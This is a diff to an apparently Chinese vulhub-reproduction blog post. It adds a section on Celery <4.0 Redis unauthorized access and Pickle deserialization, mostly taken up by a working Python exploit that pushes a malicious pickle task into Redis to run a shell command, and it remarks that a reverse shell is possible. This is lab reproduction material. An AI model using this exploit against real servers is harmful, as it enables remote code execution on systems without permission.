@@ -63,8 +63,10 @@
 <meta property="og:image" content="http://sovohelp.fit/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230103234138669.png">
 <meta property="og:image" content="http://sovohelp.fit/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230103234451467.png">
 <meta property="og:image" content="http://sovohelp.fit/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230103234752107.png">
+<meta property="og:image" content="http://sovohelp.fit/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230104104448561.png">
+<meta property="og:image" content="http://sovohelp.fit/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230104104505481.png">
 <meta property="article:published_time" content="2023-01-02T09:50:11.000Z">
-<meta property="article:modified_time" content="2023-01-03T15:48:13.814Z">
+<meta property="article:modified_time" content="2023-01-04T02:46:17.761Z">
 <meta property="article:author" content="sovo">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://sovohelp.fit/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/ff97801964cf1ba1c11b82c363117292.png">
@@ -289,7 +291,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          9.2k 字
+          11k 字
         
       </span>
     
@@ -300,7 +302,7 @@
         
         
         
-          77 分钟
+          92 分钟
         
       </span>
     
@@ -522,6 +524,13 @@
 <img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230103234752107.png" srcset="/img/loading.gif" lazyload class="" title="image-20230103234752107">
 
 <p>成功执行命令，由此也可以反弹shell等操作</p>
+<h2 id="Celery-lt-4-0-Redis未授权访问-Pickle反序列化利用"><a href="#Celery-lt-4-0-Redis未授权访问-Pickle反序列化利用" class="headerlink" title="Celery &lt;4.0 Redis未授权访问+Pickle反序列化利用"></a>Celery &lt;4.0 Redis未授权访问+Pickle反序列化利用</h2><p>Celery 是一个简单、灵活且可靠的分布式系统，用于处理大量消息，同时为操作提供维护此类系统所需的工具。它是一个专注于实时处理的任务队列，同时也支持任务调度。</p>
+<p>在Celery &lt; 4.0版本默认使用Pickle进行任务消息的序列化传递，当所用队列服务（比如Redis、RabbitMQ、RocketMQ等等等）存在未授权访问问题时，可利用Pickle反序列化漏洞执行任意代码。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> redis<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-comment"># redis连接创建</span><br>r = redis.Redis(host=sys.argv[<span class="hljs-number">1</span>], port=<span class="hljs-number">6379</span>, decode_responses=<span class="hljs-literal">True</span>,db=<span class="hljs-number">0</span>) <br><span class="hljs-comment"># celery的任务传递格式</span><br>ori_str=<span class="hljs-string">&quot;&#123;\&quot;content-type\&quot;: \&quot;application/x-python-serialize\&quot;, \&quot;properties\&quot;: &#123;\&quot;delivery_tag\&quot;: \&quot;16f3f59d-003c-4ef4-b1ea-6fa92dee529a\&quot;, \&quot;reply_to\&quot;: \&quot;9edb8565-0b59-3389-944e-a0139180a048\&quot;, \&quot;delivery_mode\&quot;: 2, \&quot;body_encoding\&quot;: \&quot;base64\&quot;, \&quot;delivery_info\&quot;: &#123;\&quot;routing_key\&quot;: \&quot;celery\&quot;, \&quot;priority\&quot;: 0, \&quot;exchange\&quot;: \&quot;celery\&quot;&#125;, \&quot;correlation_id\&quot;: \&quot;6e046b48-bca4-49a0-bfa7-a92847216999\&quot;&#125;, \&quot;headers\&quot;: &#123;&#125;, \&quot;content-encoding\&quot;: \&quot;binary\&quot;, \&quot;body\&quot;: \&quot;gAJ9cQAoWAMAAABldGFxAU5YBQAAAGNob3JkcQJOWAQAAABhcmdzcQNLZEvIhnEEWAMAAAB1dGNxBYhYBAAAAHRhc2txBlgJAAAAdGFza3MuYWRkcQdYAgAAAGlkcQhYJAAAADZlMDQ2YjQ4LWJjYTQtNDlhMC1iZmE3LWE5Mjg0NzIxNjk5OXEJWAgAAABlcnJiYWNrc3EKTlgJAAAAdGltZWxpbWl0cQtOToZxDFgGAAAAa3dhcmdzcQ19cQ5YBwAAAHRhc2tzZXRxD05YBwAAAHJldHJpZXNxEEsAWAkAAABjYWxsYmFja3NxEU5YBwAAAGV4cGlyZXNxEk51Lg==\&quot;&#125;&quot;</span><br>task_dict = json.loads(ori_str)<br>command = <span class="hljs-string">&#x27;touch /tmp/celery_success&#x27;</span><br><span class="hljs-comment"># 创建Person类，pickle反序列化时执行命令</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>    	<span class="hljs-comment"># 未导入os模块，通用</span><br>    	<span class="hljs-keyword">return</span> (<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system, (command,))<br>pickleData = pickle.dumps(Person())<br>task_dict[<span class="hljs-string">&#x27;body&#x27;</span>]=base64.b64encode(pickleData).decode()<br><span class="hljs-built_in">print</span>(task_dict)<br>r.lpush(<span class="hljs-string">&#x27;celery&#x27;</span>,json.dumps(task_dict))<br></code></pre></td></tr></table></figure>
+
+<h3 id="复现-3"><a href="#复现-3" class="headerlink" title="复现"></a>复现</h3><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230104104448561.png" srcset="/img/loading.gif" lazyload class="" title="image-20230104104448561">
+
+<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20230104104505481.png" srcset="/img/loading.gif" lazyload class="" title="image-20230104104505481">
 
                 
               </div>
